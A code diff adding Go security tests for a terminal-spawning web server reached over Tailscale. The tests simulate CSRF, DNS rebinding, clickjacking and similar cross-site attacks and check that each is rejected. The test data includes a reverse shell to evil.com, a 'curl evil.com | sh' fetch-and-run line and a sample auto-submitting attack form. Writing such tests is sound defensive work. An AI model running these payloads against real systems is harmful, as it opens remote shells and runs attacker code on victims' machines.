@@ -474,6 +474,223 @@ func TestCSRFTokenGeneration(t *testing.T) {
 }
 
 // =============================================================================
+// ATTACK SIMULATIONS
+// These tests simulate actual attack scenarios an attacker might try.
+// =============================================================================
+
+// Attack: Malicious website tries to spawn a reverse shell on your machine
+// Vector: You visit evil.com while on your Tailnet, their JS submits a form
+func TestAttack_CrossSiteSpawnReverseShell(t *testing.T) {
+	// Attacker's payload: spawn bash with a reverse shell command
+	form := url.Values{}
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")
+	// Attacker doesn't have CSRF token - they can't read your page (same-origin policy)
+	// So they either guess or omit it
+	form.Set("csrf", "attacker-guessed-token")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "https://evil.com") // Browser sends real origin
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("ATTACK SUCCEEDED: Cross-site reverse shell spawn returned %d, expected 403", w.Code)
+	}
+}
+
+// Attack: Attacker knows your Tailscale IP range, sprays requests
+func TestAttack_TailscaleIPSpray(t *testing.T) {
+	// Attacker script on evil.com tries all 100.x.x.x IPs
+	// For each IP, tries to spawn a session
+
+	form := url.Values{}
+	form.Set("dir", "/")
+	form.Set("cmd", "curl evil.com/pwned")
+	// No CSRF token - attacker can't get it without reading your page
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "https://attacker-script.com")
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("ATTACK SUCCEEDED: IP spray attack returned %d, expected 403", w.Code)
+	}
+}
+
+// Attack: Hidden form auto-submit (classic CSRF)
+func TestAttack_HiddenFormAutoSubmit(t *testing.T) {
+	// Attacker embeds this in their page:
+	// <form action="http://100.x.x.x:8090/spawn" method="POST" id="f">
+	//   <input name="dir" value="/tmp">
+	//   <input name="cmd" value="malicious">
+	// </form>
+	// <script>document.getElementById('f').submit()</script>
+
+	form := url.Values{}
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "curl evil.com | sh")
+	// No CSRF token
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "https://phishing-site.com")
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("ATTACK SUCCEEDED: Hidden form CSRF returned %d, expected 403", w.Code)
+	}
+}
+
+// Attack: img tag triggers GET request to spawn ttyd
+func TestAttack_ImgTagSpawnTtyd(t *testing.T) {
+	// Attacker embeds: <img src="http://100.x.x.x:8090/connect/session-name">
+	// This would spawn ttyd if /connect accepted GET
+
+	req := httptest.NewRequest("GET", "/connect/claude-project-cozy-otter", nil)
+	// GET requests don't have Origin header typically, but may have Referer
+	req.Header.Set("Referer", "https://evil.com/page-with-img-tag")
+
+	w := httptest.NewRecorder()
+	handleConnect(w, req)
+
+	// Must reject GET
+	if w.Code != http.StatusMethodNotAllowed {
+		t.Errorf("ATTACK SUCCEEDED: img tag GET request returned %d, expected 405", w.Code)
+	}
+}
+
+// Attack: iframe embedding to clickjack
+func TestAttack_ClickjackingViaIframe(t *testing.T) {
+	// Attacker puts your page in an iframe and overlays fake UI
+	// User thinks they're clicking attacker's button but actually clicks your spawn
+
+	// This test verifies the form submission still needs CSRF even if framed
+	form := url.Values{}
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "id")
+	// The iframe can submit the form, but without CSRF token from reading the page
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	// When framed cross-origin, Origin will be the parent frame's origin
+	req.Header.Set("Origin", "https://clickjack-site.com")
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("ATTACK SUCCEEDED: Clickjacking iframe attack returned %d, expected 403", w.Code)
+	}
+}
+
+// Attack: DNS rebinding to bypass same-origin
+func TestAttack_DNSRebinding(t *testing.T) {
+	// Attacker's domain evil.com initially resolves to their server
+	// After you load the page, they rebind DNS to your Tailscale IP
+	// Browser still thinks it's evil.com but requests go to your machine
+
+	// However, the Origin header will still be "http://evil.com"
+	// And our CSRF token won't match what evil.com's JS knows
+
+	form := url.Values{}
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "whoami")
+	form.Set("csrf", "attacker-cannot-know-this")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "http://evil.com") // DNS rebound but origin stays
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("ATTACK SUCCEEDED: DNS rebinding attack returned %d, expected 403", w.Code)
+	}
+}
+
+// Attack: Kill all sessions (DoS)
+func TestAttack_KillAllSessions(t *testing.T) {
+	// Attacker tries to kill sessions without knowing CSRF token
+
+	form := url.Values{}
+	// No CSRF token
+
+	req := httptest.NewRequest("POST", "/kill/claude-project-happy-otter", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "https://dos-attacker.com")
+
+	w := httptest.NewRecorder()
+	handleKill(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("ATTACK SUCCEEDED: Session kill DoS returned %d, expected 403", w.Code)
+	}
+}
+
+// Attack: Attacker with CSRF token but wrong origin
+func TestAttack_StolenCSRFWrongOrigin(t *testing.T) {
+	// Suppose attacker somehow got the CSRF token (unlikely but test defense-in-depth)
+	// Origin check should still block them
+
+	form := url.Values{}
+	form.Set("csrf", csrfToken) // Attacker has the real token!
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "pwned")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "https://attacker-with-token.com")
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	// Defense in depth: even with CSRF token, wrong origin is rejected
+	if w.Code != http.StatusForbidden {
+		t.Errorf("ATTACK SUCCEEDED: Stolen CSRF + wrong origin returned %d, expected 403", w.Code)
+	}
+}
+
+// Attack: Null origin (sandboxed iframe)
+func TestAttack_NullOrigin(t *testing.T) {
+	// Sandboxed iframes and some other contexts send Origin: null
+
+	form := url.Values{}
+	form.Set("csrf", csrfToken)
+	form.Set("dir", "/tmp")
+	form.Set("cmd", "id")
+
+	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", "null")
+
+	w := httptest.NewRecorder()
+	handleSpawn(w, req)
+
+	if w.Code != http.StatusForbidden {
+		t.Errorf("ATTACK SUCCEEDED: null origin attack returned %d, expected 403", w.Code)
+	}
+}
+
+// Attack: WebSocket hijacking from evil page
+func TestAttack_WebSocketHijackDocumentation(t *testing.T) {
+	// This attack is blocked by ttyd's --check-origin flag, not our Go code
+	// Document the protection:
+	t.Log("WebSocket hijacking blocked by ttyd -O (--check-origin) flag")
+	t.Log("Attack: evil.com JS does new WebSocket('ws://100.x.x.x:7700/ws')")
+	t.Log("Protection: ttyd rejects if Origin header doesn't match server host")
+	t.Log("Verify: ps aux | grep ttyd | grep -- '-O'")
+}
+
+// =============================================================================
 // FUNCTIONAL TESTS
 // =============================================================================
 
